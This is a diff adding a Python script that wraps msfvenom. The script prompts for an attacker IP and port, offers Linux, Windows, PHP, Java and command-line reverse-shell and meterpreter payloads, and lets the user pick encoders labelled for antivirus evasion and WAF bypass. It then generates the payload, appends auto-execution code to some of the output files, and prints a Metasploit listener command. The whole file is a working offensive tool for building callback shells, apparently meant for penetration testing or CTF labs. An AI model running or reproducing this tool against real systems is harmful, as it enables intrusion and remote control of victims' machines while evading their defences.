@@ -1,0 +1,455 @@
+#! /usr/bin/env python3
+
+
+import os
+import sys
+import subprocess
+import base64
+import re
+import socket
+import platform
+
+
+# Function to resolve interface name to IP address
+def resolve_interface(interface):
+    try:
+        # Try to see if it's already an IP address
+        socket.inet_aton(interface)
+        return interface
+    except socket.error:
+        # If not an IP, try to resolve as interface name
+        try:
+            output = subprocess.check_output(['ip', 'addr', 'show', interface], text=True)
+            ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', output)
+            if ip_match:
+                resolved_ip = ip_match.group(1)
+                print(f"\033[93mResolved interface {interface} to IP: {resolved_ip}\033[0m")
+                return resolved_ip
+        except:
+            pass
+        
+        # As fallback, try to resolve as hostname
+        try:
+            resolved_ip = socket.gethostbyname(interface)
+            print(f"\033[93mResolved hostname {interface} to IP: {resolved_ip}\033[0m")
+            return resolved_ip
+        except socket.gaierror:
+            print(f"\033[91mWarning: Could not resolve {interface} to an IP address. Using as is.\033[0m")
+            return interface  # Return original value if all else fails
+
+# Function to display payload options
+def display_payload_options():
+    # Updated list of payloads based on your requirements
+    payloads = [
+        " linux/x64/shell_reverse_tcp",
+        " linux/x86/shell_reverse_tcp",
+        " linux/x64/meterpreter/reverse_tcp",
+        " linux/x86/meterpreter/reverse_tcp",
+        " linux/x64/shell/reverse_tcp"  ,
+        " linux/x86/shell/reverse_tcp",
+        " windows/x64/shell_reverse_tcp",
+        " windows/shell_reverse_tcp",
+        " windows/x64/meterpreter/reverse_tcp",
+        "windows/meterpreter/reverse_tcp",
+        "windows/x64/shell/reverse_tcp",
+        "windows/shell/reverse_tcp",
+        "php/meterpreter/reverse_tcp", 
+        "java/jsp_shell_reverse_tcp",
+        "cmd/unix/reverse_python",
+        "cmd/unix/reverse_bash",
+        "cmd/unix/reverse_netcat",
+        "cmd/windows/reverse_powershell",
+            
+    ]
+    print("\033[93mSelect a payload:\033[0m")
+    for i, payload in enumerate(payloads):
+        print(f"\033[92m{i+1}. {payload}\033[0m")
+
+    while True: 
+        try:
+            choice = int(input("\033[93mEnter the number of your choice:\033[0m "))      
+         #   choice = int(input("Enter the number of your choice: "))       
+            if 1 <= choice <= len(payloads):
+                return payloads[choice - 1]
+            else:
+                print("Invalid choice. Try again.")
+        except ValueError:
+            print("Please enter a valid number. Try again.")
+    
+    return payloads[choice - 1]
+
+# Function to select an encoder based on payload architecture
+def display_encoder_options(payload):
+    # Define encoder options based on architecture
+    is_x64 = "x64" in payload
+    is_windows = "windows" in payload
+    is_php = "php" in payload
+    is_cmd = "cmd" in payload
+    is_linux = "linux" in payload
+    
+    encoders = []
+    
+    # ---- CUSTOM CATEGORIES FOR BETTER ORGANIZATION ----
+    polymorphic_encoders = []
+    alphanumeric_encoders = []
+    platform_specific_encoders = []
+    evasion_focused_encoders = []
+    
+    # ---- POLYMORPHIC & HIGHLY RATED ENCODERS ----
+    if is_x64:
+        polymorphic_encoders.append(("x64/zutto_dekiru", "Zutto Dekiru (x64) - Best for x64 AV Evasion"))
+    
+    if "x86" in payload or (is_windows and not is_x64):
+        polymorphic_encoders.append(("x86/shikata_ga_nai", "Shikata Ga Nai - Polymorphic XOR (Excellent)"))
+        polymorphic_encoders.append(("x86/call4_dword_xor", "Call+4 Dword XOR - Polymorphic"))
+        polymorphic_encoders.append(("x86/countdown", "Countdown - Polymorphic"))
+        polymorphic_encoders.append(("x86/jmp_call_additive", "Jump/Call/Additive - Polymorphic"))
+    
+    # ---- ALPHANUMERIC ENCODERS (good for WAF bypass) ----
+    if "x86" in payload or (is_windows and not is_x64):
+        alphanumeric_encoders.append(("x86/alpha_mixed", "Alpha2 Alphanumeric Mixedcase - WAF Bypass"))
+        alphanumeric_encoders.append(("x86/alpha_upper", "Alpha2 Alphanumeric Uppercase - WAF Bypass"))
+        alphanumeric_encoders.append(("x86/unicode_mixed", "Unicode Alphanumeric Mixedcase - WAF Bypass"))
+        alphanumeric_encoders.append(("x86/unicode_upper", "Unicode Alphanumeric Uppercase - WAF Bypass"))
+        # Good for bypassing input filters that remove non-alphanumeric chars
+        # Removed as per user request: Non-Alpha and Non-Uppercase encoders
+    
+    # ---- PLATFORM SPECIFIC ENCODERS ----
+    if is_php:
+        platform_specific_encoders.append(("php/base64", "PHP Base64 Encoder (Great)"))
+        platform_specific_encoders.append(("php/hex", "PHP Hex Encoder (Great)"))
+        platform_specific_encoders.append(("php/minify", "PHP Minify Encoder (Great)"))
+    
+    if is_cmd:
+        platform_specific_encoders.append(("cmd/base64", "Base64 Command Encoder (Good)"))
+        platform_specific_encoders.append(("cmd/echo", "Echo Command Encoder (Good)"))
+        platform_specific_encoders.append(("cmd/generic_sh", "Generic Shell Variable Substitution"))
+        platform_specific_encoders.append(("cmd/perl", "Perl Command Encoder"))
+        platform_specific_encoders.append(("cmd/ifs", "Bourne IFS Substitution - Firewall Bypass"))
+        if is_windows:
+            platform_specific_encoders.append(("cmd/powershell_base64", "Powershell Base64 Command Encoder (Excellent)"))
+    
+    # ---- OTHER SPECIALIZED EVASION ENCODERS ----
+    if not is_cmd:
+        # XOR-based encoders (good for AV evasion)
+        evasion_focused_encoders.append(("x86/xor", "XOR Encoder - Simple AV Bypass"))
+        evasion_focused_encoders.append(("x86/xor_dynamic", "Dynamic XOR - Variable Key"))
+        evasion_focused_encoders.append(("x86/context_cpuid", "Context CPUID - Hardware-based XOR"))
+        
+        # Add platform specific encoders that focus on evasion
+        if is_windows or is_linux:
+            evasion_focused_encoders.append(("x86/opt_sub", "Sub Optimizer - Subtract encoding"))
+            evasion_focused_encoders.append(("x86/bloxor", "BloXor - Block-based XOR"))
+            
+    # ---- AGGREGATE ALL ENCODER CATEGORIES ----
+    # Add a header and the encoders from each category
+    if polymorphic_encoders:
+        encoders.append(("header", "--- POLYMORPHIC ENCODERS (Best for AV Evasion) ---"))
+        encoders.extend(polymorphic_encoders)
+    
+    if alphanumeric_encoders:
+        encoders.append(("header", "--- ALPHANUMERIC ENCODERS (Best for WAF Bypass) ---"))
+        encoders.extend(alphanumeric_encoders)
+    
+    if evasion_focused_encoders:
+        encoders.append(("header", "--- SPECIALIZED EVASION ENCODERS ---"))
+        encoders.extend(evasion_focused_encoders)
+    
+    if platform_specific_encoders:
+        encoders.append(("header", "--- PLATFORM SPECIFIC ENCODERS ---"))
+        encoders.extend(platform_specific_encoders)
+    
+    # If no specific encoders for this type, return empty string
+    if not encoders:
+        return ""
+    
+    print("\033[93mSelect an encoder (or 0 for no encoding):\033[0m")
+    print("\033[92m0. No encoding\033[0m")
+    
+    # Filter out headers for selection purposes
+    selectable_encoders = [(name, desc) for name, desc in encoders if name != "header"]
+    
+    # Display encoders with headers
+    index = 1
+    for name, desc in encoders:
+        if name == "header":
+            print(f"\033[1;94m{desc}\033[0m")  # Blue, bold for headers
+        else:
+            print(f"\033[92m{index}. {desc}\033[0m")
+            index += 1
+    
+    encoder_option = ""
+    while True:
+        try:
+            choice = int(input("\033[93mEnter the number of your choice:\033[0m "))
+            if choice == 0:
+                return ""
+            elif 1 <= choice <= len(selectable_encoders):
+                encoder_option = f"--encoder {selectable_encoders[choice-1][0]}"
+                break
+            else:
+                print("Invalid choice. Try again.")
+        except ValueError:
+            print("Please enter a valid number. Try again.")
+    
+    # For most encoders, ask for iterations to improve evasion
+    if any(x in encoder_option for x in ["shikata_ga_nai", "zutto_dekiru", "alpha", "xor", "call4", "countdown", "bloxor"]):
+        while True:
+            try:
+                iterations = input("\033[93mEnter number of iterations (1-20) [default: 1]:\033[0m ")
+                if not iterations:
+                    iterations = "1"
+                    break
+                iterations = int(iterations)
+                if 1 <= iterations <= 20:
+                    iterations = str(iterations)
+                    break
+                else:
+                    print("Please enter a number between 1 and 20.")
+            except ValueError:
+                print("Please enter a valid number.")
+        
+        if iterations != "1":
+            encoder_option += f" -i {iterations}"
+    
+    return encoder_option
+
+# Function to display file format options
+def display_format_options(payload):
+    formats = {
+        "linux": ["elf", "sh"],
+        "windows": ["exe", "dll"],
+        "php": ["php", "raw"],
+        "java": ["war", "jar", "raw"],
+        "cmd/unix": ["py", "sh", "raw"],
+        "cmd/windows/reverse_powershell": ["ps1", "raw"],
+        "cmd/windows": ["bat", "raw"],
+        "cmd": ["py", "raw"]
+    }
+     
+    # Handle special payload cases first, then fall back to general categories
+    if "cmd/windows/reverse_powershell" in payload:
+        payload_type = "cmd/windows/reverse_powershell"
+    elif "cmd/windows" in payload:
+        payload_type = "cmd/windows"
+    elif "cmd/unix" in payload:
+        payload_type = "cmd/unix"
+    # Then check general categories
+    elif "linux" in payload:
+        payload_type = "linux"
+    elif "windows" in payload:
+        payload_type = "windows"
+    elif "php" in payload:
+        payload_type = "php"
+    elif "java" in payload:
+        payload_type = "java"
+    elif "cmd" in payload:
+        payload_type = "cmd"
+    else:
+        payload_type = ""
+
+    available_formats = formats.get(payload_type, [])
+    # Special case for Linux meterpreter payloads
+    if all(x in payload for x in ["meterpreter", "linux"]):
+        available_formats = ['elf']
+ 
+    print(available_formats)
+    if len(available_formats) == 1:
+        print(f"\033[93mOnly one file format available: {available_formats[0]}\033[0m")
+        return available_formats[0]
+    else:
+        print("\033[93mSelect a file format:\033[0m")
+        for i, format in enumerate(available_formats):
+           print(f"\033[92m{i+1}. {format}\033[0m")
+        
+
+    while True: 
+        try:
+            choice = int(input("\033[93mEnter the number of your choice:\033[0m "))      
+            if 1 <= choice <= len(available_formats):
+                selected_format = available_formats[choice - 1]
+                return selected_format
+            else:
+                    print("Invalid choice. Try again.")
+        except ValueError:
+            print("Please enter a valid number. Try again.")   
+            
+    return formats[payload_type][choice - 1]
+
+# Collect user input
+try:
+    ip = input("\033[93mIP attacker? [default:  tun0] \033[0m   ")
+    port = input("\033[93mPORT attacker [default: 9000]?\033[0m   ")
+    file = input("\033[93mNAME OF FILE? [default:  shell]\033[0m   ")
+except KeyboardInterrupt:
+    print(f"\n\nexiting...\n\n")
+    sys.exit(0)
+if not ip:
+    ip="tun0"
+if not port:
+    port="9000"
+if not file:
+    file="shell"
+
+# Resolve the IP address if it's an interface name
+resolved_ip = resolve_interface(ip)
+print(f"Resolved IP: {resolved_ip}")
+# Display payload and format options and get user choice
+try:
+    print("PAYLOAD OPTIONS:")
+    payload = display_payload_options()
+    
+    # Skip encoder selection for certain command payloads
+    skip_encoding_payloads = [
+        "cmd/unix/reverse_python",
+        "cmd/unix/reverse_bash", 
+        "cmd/unix/reverse_netcat",
+        "cmd/windows/reverse_powershell"
+    ]
+    
+    if any(payload.strip() == skip_payload for skip_payload in skip_encoding_payloads):
+        print(f"\033[93mSkipping encoder selection for {payload.strip()} (works best without encoding)\033[0m")
+        encoder = ""
+    else:
+        # Ask about encoder options
+        encoder = display_encoder_options(payload)
+    
+    print("FILE FORMAT OPTIONS:")
+    formatFile = display_format_options(payload)
+except KeyboardInterrupt:
+    print(f"\n\nexiting...\n\n")
+    sys.exit(0)
+
+# Build command with encoder if selected
+if formatFile == "php":
+    command = f"msfvenom -p {payload} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+elif formatFile == "elf":
+    command = f"msfvenom -p {payload} -f {formatFile} -o {file} LHOST={ip} LPORT={port} {encoder}"
+elif formatFile == "raw":
+    # Print which encoder is being used (if any) for debugging
+    if encoder:
+        print(f"\033[93mUsing encoder: {encoder}\033[0m")
+        
+    if payload.startswith("cmd/"):
+        # For command payloads we need to ensure proper encoding by using the right flags
+        # Add verbose flag to show encoding details
+        command = f"msfvenom -p {payload} -f raw -o {file}_raw.sh LHOST={ip} LPORT={port} {encoder}"
+        print(f"\033[93mRaw output will be saved to {file}_raw.sh\033[0m")
+        print(f"\033[93mNote: Some cmd encoders may not visibly transform the output.\033[0m")
+        if "ifs" in encoder:
+            print(f"\033[93mTip: If IFS encoding isn't visible, try cmd/generic_sh encoder instead.\033[0m")
+    else:
+        # For non-command payloads, still save to a .sh file
+        command = f"msfvenom -p {payload} -f raw -o {file}_raw.sh LHOST={ip} LPORT={port} {encoder}"
+        print(f"\033[93mRaw output will be saved to {file}_raw.sh\033[0m")
+elif formatFile == "ps1":
+    # PowerShell payloads need special handling
+    command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+elif formatFile == "py":
+    # Generate Python payload directly without special processing
+    command = f"msfvenom -p {payload} -f py -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+elif formatFile in ["sh", "bat"]:
+   
+    if payload.startswith("cmd/"):
+        # Add file extension for command payloads too
+        command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+    else:
+        command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+else:
+    command = f"msfvenom -p {payload} -f {formatFile} -o {file}.{formatFile} LHOST={ip} LPORT={port} {encoder}"
+
+
+print("Generated command:")
+print(command)
+print("Executing...")
+
+try:
+    # Execute the command
+    os.system(command)
+    
+    # Add special execution code for Python files with cmd payloads
+    if formatFile == "py" and payload.startswith("cmd/"):
+        py_file_path = f"{file}.py"
+        if os.path.exists(py_file_path):
+            # Add code to execute the shell command
+            with open(py_file_path, 'a') as f:
+                f.write("\n\n# Auto-execution code\n")
+                f.write("import subprocess\n")
+                f.write("shell_command = buf.decode(\"utf-8\")\n")
+                f.write("# Escape any double quotes in the payload\n")
+                f.write("escaped_command = shell_command.replace('\"', r'\\\"')\n")
+                f.write("final_command = f'/bin/bash -c \"{escaped_command} 2>/dev/null\"'\n")
+                f.write("print(f\"Executing: {final_command}\")\n")
+                f.write("subprocess.call(final_command, shell=True)\n")
+            print(f"\033[92mAdded auto-execution code to {py_file_path}\033[0m")
+    
+    # Make shell scripts executable when they're command payloads
+    if formatFile == "sh" and payload.startswith("cmd/"):
+        sh_file_path = f"{file}.sh"
+        if os.path.exists(sh_file_path):
+            try:
+                with open(sh_file_path, 'r') as f:
+                    content = f.read()                
+                with open(sh_file_path, 'a') as f:
+                    f.write("\n\n# Auto-execution code\n")
+                    f.write("bash -c \"$buf\"\n")
+                
+                # Make the shell script executable
+                os.chmod(sh_file_path, 0o755)
+                print(f"\033[92mAdded execution code and made {sh_file_path} executable\033[0m")
+                print(f"\033[92mYou can run it directly with: bash {sh_file_path}\033[0m")
+            except Exception as e:
+                print(f"\033[91mError adding execution code: {e}\033[0m")
+except:
+    print(f"\n\nexiting...\n\n")
+    sys.exit(0)
+
+# Print the listener command with the resolved IP
+listener_command = f'sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {resolved_ip}; set LPORT {port}; exploit"'
+print("\nTo set up the listener, run the following command:")
+print(f"\033[1;31m{listener_command}\033[0m")  # 1 is for bold, 31 is for red, and 0m resets it
+
+# Check if user chose raw format and offer to display the content
+if formatFile == "raw":
+    try:
+        raw_file_path = f"{file}_raw.sh"
+        if os.path.exists(raw_file_path):
+            # Read the content to determine the appropriate file extension
+            with open(raw_file_path, 'r') as f:
+                content = f.read()
+            
+            # Detect the content type and rename appropriately
+            new_file_path = raw_file_path
+            if "buf =" in content or "unsigned char buf[]" in content:
+                # Buffer content, save as text
+                new_file_path = f"{file}_raw.txt"
+            elif "<?php" in content or "<?=" in content:
+                # PHP content
+                new_file_path = f"{file}_raw.php"
+            elif "class " in content and "public static void main" in content:
+                # Java content
+                new_file_path = f"{file}_raw.java"
+            elif "powershell" in content.lower() or "$" in content and "-" in content:
+                # PowerShell content
+                new_file_path = f"{file}_raw.ps1"
+            elif any(cmd in content.lower() for cmd in ["bash", "/bin/sh", "cmd", "nc ", "python", "perl", "mkfifo"]):
+                # Shell command detected, keep .sh extension
+                new_file_path = f"{file}_raw.sh"
+            else:
+                # Default to text if can't determine
+                new_file_path = f"{file}_raw.txt"
+            
+            # Rename the file if needed
+            if new_file_path != raw_file_path:
+                os.rename(raw_file_path, new_file_path)
+                print(f"\033[93mDetected content type and renamed to {new_file_path}\033[0m")
+                raw_file_path = new_file_path
+
+            view_content = input(f"\n\033[93mDo you want to view the content of {raw_file_path}? (y/n): \033[0m")
+            if view_content.lower() == 'y' or view_content.lower() == 'yes':
+                print(f"\n\033[92m--- Content of {raw_file_path} ---\033[0m")
+                with open(raw_file_path, 'r') as f:
+                    print(f.read())
+                print(f"\033[92m--- End of file content ---\033[0m")
+    except Exception as e:
+        print(f"\033[91mError processing file: {e}\033[0m")
